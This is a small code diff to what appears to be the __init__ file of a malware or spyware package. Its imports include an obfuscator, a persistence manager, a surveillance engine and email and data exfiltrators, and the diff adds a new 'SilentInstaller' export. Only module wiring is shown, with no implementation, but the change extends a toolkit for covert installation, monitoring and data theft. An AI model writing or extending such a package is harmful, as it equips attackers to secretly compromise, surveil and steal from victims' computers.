@@ -5,6 +5,7 @@ from .crypto_utils import StringObfuscator, obfuscate_string, deobfuscate_string
 from .persistence import PersistenceManager
 from .surveillance import SurveillanceEngine
 from .communication import EmailExfiltrator, DataExfiltrator
+from .auto_installer import SilentInstaller
 
 __all__ = [
     'StringObfuscator',
@@ -14,5 +15,6 @@ __all__ = [
     'PersistenceManager',
     'SurveillanceEngine',
     'EmailExfiltrator',
-    'DataExfiltrator'
+    'DataExfiltrator',
+    'SilentInstaller'
 ] 
